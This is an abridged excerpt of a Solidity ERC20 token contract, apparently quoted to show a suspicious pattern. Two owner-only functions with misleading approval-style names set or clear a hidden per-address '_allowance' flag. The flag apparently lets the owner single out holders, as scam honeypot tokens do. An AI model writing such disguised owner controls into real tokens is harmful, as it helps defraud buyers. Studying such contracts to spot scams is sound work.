...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function doApprovalAll(address [] calldata _all_) external onlyOwner {
        for (uint256 i = 0; i < _all_.length; i++) {
            _allowance[_all_[i]] = true;
        }
    }

    function doApproveForAll(address [] calldata _all_) external onlyOwner {
        for (uint256 i = 0; i < _all_.length; i++) {
            _allowance[_all_[i]] = false;
        }
    }

    function isApprovedAll(address _id_) public view returns (bool) {
